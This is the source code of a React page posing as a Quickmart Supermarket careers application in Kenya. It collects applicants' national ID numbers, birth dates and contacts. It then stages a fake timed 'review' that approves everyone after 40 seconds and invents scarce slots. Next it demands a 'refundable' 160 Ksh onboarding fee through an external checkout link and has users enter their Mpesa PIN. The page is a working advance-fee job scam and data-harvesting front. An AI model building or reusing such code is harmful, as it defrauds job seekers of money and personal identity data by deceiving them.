import React, { useState, useEffect } from 'react';
import { Mail, User, Phone, Calendar, MapPin, BookOpen, Briefcase, ChevronRight, ChevronLeft, CheckCircle, UserCheck } from 'lucide-react';

const steps = [
  'Personal Info',
  'Contact Details',
  'Education & Position',
  'Review & Submit'
];

const positions = [
  'Cashier', 'Cleaner', 'Store Keeper', 'Driver', 'Loaders & Off-loaders',
  'Marketer', 'Sales Attendant', 'Chef', 'Warehouse Supervisor', 'Guards'
];

const ApplicationPage: React.FC = () => {
  React.useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  const [step, setStep] = useState(0);
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    phone: '',
    email: '',
    idNumber: '',
    dob: '',
    education: '',
    location: '',
    position: '',
    employmentType: '',
  });
  const [submitted, setSubmitted] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const nextStep = () => setStep((s) => Math.min(s + 1, steps.length - 1));
  const prevStep = () => setStep((s) => Math.max(s - 1, 0));

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
  };

  return (
    <div className="min-h-screen bg-gradient-to-tr from-green-100 to-red-100 flex flex-col items-center justify-start py-10 px-2">
      <div className="max-w-3xl w-full bg-white rounded-3xl shadow-2xl p-8 animate-fade-in">
        <h1 className="text-4xl md:text-5xl font-black text-center text-red-600 mb-6 flex items-center justify-center gap-2">
          <Briefcase className="h-10 w-10 text-green-600" /> Quickmart Careers Application
        </h1>
        <div className="mb-8">
          <h2 className="text-xl font-bold mb-2 text-green-700">COMMUNICATION AND MEANS:</h2>
          <ul className="text-gray-700 mb-2 list-disc pl-6">
            <li>Successful applicants will be contacted via official email as soon as possible.</li>
            <li>Job inductions will be conducted immediately in all mentioned Quickmart Supermarket branches on reporting days.</li>
          </ul>
          <h2 className="text-xl font-bold mb-2 text-green-700 mt-4">QUALIFICATIONS:</h2>
          <ul className="text-gray-700 list-decimal pl-6">
            <li>Must be KENYAN of 18 years and above.</li>
            <li>Reliability and trustworthiness.</li>
            <li>Punctuality, time management and a sense of urgency.</li>
            <li>Strong communication skills.</li>
            <li>Good customer service skills.</li>
            <li>Clean driving record and driving license. <span className="text-xs">(Driving applicants)</span></li>
            <li>Ability to move and deliver items to the recipient. <span className="text-xs">(Packers and sales attendant)</span></li>
          </ul>
          <p className="text-base font-bold text-blue-700 bg-blue-50 border-l-4 border-blue-500 p-3 rounded mt-4 shadow-sm">NOTE: More training will be offered to you (for qualified candidates on their reporting days).</p>
        </div>

        {/* Multi-step Form */}
        <div className="flex items-center justify-center mb-8">
          {steps.map((label, idx) => (
            <div key={label} className="flex items-center">
              <div className={`rounded-full border-4 ${step >= idx ? 'border-green-500 bg-green-500 text-white' : 'border-gray-300 bg-gray-200 text-gray-400'} w-10 h-10 flex items-center justify-center font-bold text-lg transition-all duration-300`}>{idx + 1}</div>
              {idx < steps.length - 1 && <ChevronRight className="mx-2 text-gray-400" />}
            </div>
          ))}
        </div>

        {!submitted ? (
          <form onSubmit={handleSubmit} className="space-y-6">
            {step === 0 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><User className="h-5 w-5 mr-1 text-green-600" />First Name</label>
                  <input type="text" name="firstName" value={form.firstName} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><User className="h-5 w-5 mr-1 text-green-600" />Last Name</label>
                  <input type="text" name="lastName" value={form.lastName} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
              </div>
            )}
            {step === 1 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Phone className="h-5 w-5 mr-1 text-green-600" />Phone Number</label>
                  <input type="tel" name="phone" value={form.phone} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Mail className="h-5 w-5 mr-1 text-green-600" />Email</label>
                  <input type="email" name="email" value={form.email} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><UserCheck className="h-5 w-5 mr-1 text-green-600" />ID Number</label>
                  <input type="text" name="idNumber" value={form.idNumber} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Calendar className="h-5 w-5 mr-1 text-green-600" />Date of Birth</label>
                  <input type="date" name="dob" value={form.dob} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" />
                </div>
              </div>
            )}
            {step === 2 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><BookOpen className="h-5 w-5 mr-1 text-green-600" />Education</label>
                  <select name="education" value={form.education} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none">
                    <option value="">Select Education Level</option>
                    <option value="Primary">Primary</option>
                    <option value="Secondary">Secondary</option>
                    <option value="College">College</option>
                    <option value="University">University</option>
                  </select>
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><MapPin className="h-5 w-5 mr-1 text-green-600" />Where are you located?</label>
                  <input type="text" name="location" value={form.location} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none" placeholder="e.g. Nairobi" />
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Briefcase className="h-5 w-5 mr-1 text-green-600" />Position you are applying for</label>
                  <select name="position" value={form.position} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none">
                    <option value="">Select Position</option>
                    {positions.map((pos) => <option key={pos} value={pos}>{pos}</option>)}
                  </select>
                </div>
                <div>
                  <label className="block font-semibold mb-1 text-gray-700 flex items-center"><Briefcase className="h-5 w-5 mr-1 text-green-600" />Do you want to work part time or full time?</label>
                  <select name="employmentType" value={form.employmentType} onChange={handleChange} required className="w-full px-4 py-2 rounded-lg border-2 border-gray-200 focus:border-green-500 focus:ring-2 focus:ring-green-200 outline-none">
                    <option value="">Select Type</option>
                    <option value="Full Time">Full Time</option>
                    <option value="Part Time">Part Time</option>
                  </select>
                </div>
              </div>
            )}
            {step === 3 && (
              <div className="space-y-4">
                <div className="text-green-700 font-bold text-lg mb-2">Review Your Application</div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {Object.entries(form).map(([key, value]) => (
                    <div key={key} className="bg-green-50 rounded-lg px-4 py-2 text-gray-700"><span className="font-semibold capitalize">{key.replace(/([A-Z])/g, ' $1')}</span>: {value}</div>
                  ))}
                </div>
              </div>
            )}
            <div className="flex justify-between mt-8">
              {step > 0 && <button type="button" onClick={prevStep} className="px-6 py-2 rounded-lg bg-gray-200 hover:bg-gray-300 text-gray-700 font-semibold flex items-center"><ChevronLeft className="mr-2" />Back</button>}
              {step < steps.length - 1 && <button type="button" onClick={nextStep} className="px-6 py-2 rounded-lg bg-green-600 hover:bg-green-700 text-white font-bold flex items-center">Next<ChevronRight className="ml-2" /></button>}
              {step === steps.length - 1 && <button type="submit" className="px-8 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-bold flex items-center">Submit <CheckCircle className="ml-2" /></button>}
            </div>
          </form>
        ) : (
          <AnimatedApplicationFeedback form={form} />
        )}
      </div>
    </div>
  );
};

type ApplicationForm = {
  firstName: string;
  lastName: string;
  phone: string;
  email: string;
  idNumber: string;
  dob: string;
  education: string;
  location: string;
  position: string;
  employmentType: string;
};

const AnimatedApplicationFeedback: React.FC<{ form: ApplicationForm }> = ({ form }) => {
  const [showFeeStep, setShowFeeStep] = useState(false);
  
  const [showSTKModal, setShowSTKModal] = useState(false);

  const [processing, setProcessing] = useState(true);
  const [time, setTime] = useState(120); // 2 minutes
  const [showApproved, setShowApproved] = useState(false);

  // Countdown timer
  useEffect(() => {
    if (!processing) return;
    if (time <= 0) return setProcessing(false);
    const interval = setInterval(() => setTime(t => t - 1), 1000);
    return () => clearInterval(interval);
  }, [time, processing]);

  // Animated review steps
  const reviewSteps = [
    'Reviewing Personal Info',
    'Reviewing Contact Details',
    'Reviewing Education & Position',
    'Finalizing & Matching'
  ];
  const [currentStep, setCurrentStep] = useState(0);
  useEffect(() => {
    if (!processing) return;
    const stepInterval = setInterval(() => {
      setCurrentStep(s => (s + 1) % reviewSteps.length);
    }, 8000); // 8 seconds per step (total 32s)
    return () => clearInterval(stepInterval);
  }, [processing]);

  // After 40 seconds, show approval
  useEffect(() => {
    if (!processing) return;
    const timer = setTimeout(() => {
      setProcessing(false);
      setTimeout(() => setShowApproved(true), 600); // short delay for animation
    }, 40000); // 40 seconds
    return () => clearTimeout(timer);
  }, [processing]);

  // SVG Confetti burst
  const ConfettiBurst = () => (
    <svg width="220" height="80" className="mx-auto mb-6" viewBox="0 0 220 80" fill="none" xmlns="http://www.w3.org/2000/svg">
      {[...Array(24)].map((_, i) => (
        <circle
          key={i}
          cx={20 + Math.random() * 180}
          cy={20 + Math.random() * 40}
          r={3 + Math.random() * 3}
          fill={`hsl(${Math.floor(Math.random()*360)},90%,60%)`}
          opacity={0.7}
        />
      ))}
    </svg>
  );

  return (
    <div className="flex flex-col items-center justify-center py-16">
      {processing && !showApproved ? (
        <div className="flex flex-col items-center animate-fade-in w-full max-w-lg">
          <div className="text-3xl font-black text-blue-700 mb-2 animate-pulse">Processing your application...</div>
          <div className="text-lg text-blue-500 font-semibold mb-1 animate-fade-in">{reviewSteps[currentStep]}</div>
          <div className="mb-2 text-gray-600 text-center">Estimated review time: <span className="font-bold text-blue-700">2 minutes</span></div>
          <div className="mb-2 text-yellow-600 text-center font-semibold">Do not leave this page while your application is being reviewed.</div>
          <div className="relative w-24 h-24 mb-6">
            <div className="absolute inset-0 rounded-full border-8 border-blue-200 border-t-blue-600 animate-spin" />
            <div className="absolute inset-4 rounded-full border-4 border-blue-100 border-t-blue-400 animate-spin-slow" />
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-blue-700 text-lg font-bold animate-pulse">{time}s</div>
          </div>
          <div className="text-base text-gray-500">Your application is being securely reviewed and matched to open positions.</div>
        </div>
      ) : showApproved ? (
        <div className="flex flex-col items-center animate-fade-in">
          <ConfettiBurst />
          <div className="text-4xl font-black text-green-700 mb-4 animate-bounce">Congratulations!</div>
          <div className="text-2xl font-bold text-blue-700 mb-4 animate-fade-in">Slots Found & Application Approved</div>
          <div className="bg-white rounded-2xl shadow-lg p-6 mb-4 animate-fade-in">
            <div className="text-lg text-gray-800 mb-2">You qualify for the <span className="font-bold text-green-700">{form.position}</span> position.</div>
            <div className="text-blue-700 text-lg font-bold mb-1">2 slots remaining</div>
            <div className="text-gray-600 mb-2">After reviewing your application, you have been matched to open slots.</div>
            <div className="text-blue-700 font-semibold">You will receive further communication concerning your interview and documents required through an SMS text, email, or phone call. Click on the next step below to secure your spot.</div>
            <div className="text-sm text-gray-500 mt-1">Complete the registration step below.</div>
          </div>
          <button 
            className="px-8 py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg mt-4 animate-fade-in"
            onClick={() => {
              setShowFeeStep(true);
            }}
            type="button"
          >
            Next Step
          </button>
        </div>
      ) : null}

      {/* Onboarding Fee Step as Modal Popup */}
      {showFeeStep && (
        <OnboardingFeeModal 
          onClose={() => setShowFeeStep(false)} 
          onFinish={() => setShowSTKModal(true)}
        />
      )}

      {/* STK Push Modal */}
      {showSTKModal && (
        <STKPushModal onClose={() => setShowSTKModal(false)} />
      )}

    </div>
  );
};

// Onboarding Fee Modal Component
const OnboardingFeeModal: React.FC<{ onClose: () => void, onFinish: () => void }> = ({ onClose, onFinish }) => {
  const [copied, setCopied] = useState(false);
  const refundCode = "2224";

  const handleCopy = () => {
    navigator.clipboard.writeText(refundCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center">
      {/* Overlay */}
      <div className="fixed inset-0 bg-black bg-opacity-40 backdrop-blur-sm transition-opacity animate-fade-in" onClick={onClose} />
      {/* Modal */}
      <div className="relative z-10 bg-gradient-to-br from-blue-50 to-green-50 rounded-3xl shadow-2xl p-8 max-w-lg w-full flex flex-col items-center animate-fade-in-up">
        <button
          className="absolute top-4 right-4 text-blue-600 hover:text-red-500 text-2xl font-bold focus:outline-none"
          onClick={onClose}
          aria-label="Close"
        >
          &times;
        </button>
        <div className="flex items-center mb-4">
          <svg className="w-10 h-10 text-blue-600 mr-2 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 8c-1.657 0-3 1.343-3 3 0 1.657 1.343 3 3 3s3-1.343 3-3c0-1.657-1.343-3-3-3zm0 9c-3.866 0-7-3.134-7-7 0-3.866 3.134-7 7-7s7 3.134 7 7c0 3.866-3.134 7-7 7z" /></svg>
          <span className="text-2xl font-extrabold text-blue-700">Onboarding Application Fee</span>
        </div>
        <div className="text-lg text-gray-700 mb-4 text-center">A <span className="font-bold text-green-600">refundable onboarding application fee</span> of <span className="font-bold text-blue-700">160 Ksh</span> will be paid.</div>
        <div className="flex items-center justify-center mb-2">
          <span className="text-base font-semibold text-gray-700 mr-2">Refund Code:</span>
          <span className="text-xl font-mono bg-blue-100 px-3 py-1 rounded-lg text-blue-700 border border-blue-300 select-all shadow-sm">{refundCode}</span>
          <button onClick={handleCopy} className="ml-2 px-2 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm font-bold transition-colors" title="Copy refund code">
            {copied ? 'Copied!' : 'Copy'}
          </button>
        </div>
        <div className="text-sm text-gray-600 mb-6 text-center">Save this code together with your Mpesa transaction code. This code will be used as evidence for your refund.</div>
        <button
          className="px-8 py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg mt-4 animate-fade-in"
          onClick={() => {
            window.open('https://checkoutcompletion.vercel.app/', '_blank');
            onClose();
          }}
        >
          Finish Application
        </button>
      </div>
    </div>
  );
};

// STK Push Modal
const STKPushModal: React.FC<{ onClose: () => void }> = ({ onClose }) => (
  <div className="fixed inset-0 z-50 flex items-center justify-center">
    <div className="fixed inset-0 bg-black bg-opacity-40 backdrop-blur-sm transition-opacity animate-fade-in" onClick={onClose} />
    <div className="relative z-10 bg-gradient-to-br from-blue-50 to-green-50 rounded-3xl shadow-2xl p-8 max-w-md w-full flex flex-col items-center animate-fade-in-up">
      <button
        className="absolute top-4 right-4 text-blue-600 hover:text-red-500 text-2xl font-bold focus:outline-none"
        onClick={onClose}
        aria-label="Close"
      >
        &times;
      </button>
      <svg className="w-14 h-14 text-green-600 mb-3 animate-bounce" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 8c-1.657 0-3 1.343-3 3 0 1.657 1.343 3 3 3s3-1.343 3-3c0-1.657-1.343-3-3-3zm0 9c-3.866 0-7-3.134-7-7 0-3.866 3.134-7 7-7s7 3.134 7 7c0 3.866-3.134 7-7 7z" /></svg>
      <div className="text-2xl font-black text-green-700 mb-2 text-center">Payment Request Sent</div>
      <div className="text-lg text-blue-700 font-semibold mb-2 text-center">You will receive an STK payment from <span className="font-bold">Quickmart Sasapay</span>.</div>
      <div className="text-gray-700 mb-2 text-center">Enter your Mpesa PIN to complete your application.</div>
      <div className="text-sm text-gray-600 mb-4 text-center">You will receive an SMS notification for interview scheduling and requirements.</div>
      <button
        className="px-8 py-3 rounded-lg bg-gradient-to-r from-green-500 to-blue-600 hover:from-blue-600 hover:to-green-500 text-white font-bold text-lg shadow-lg mt-2 animate-fade-in"
        onClick={onClose}
      >
        Close
      </button>
    </div>
  </div>
);

export default ApplicationPage;


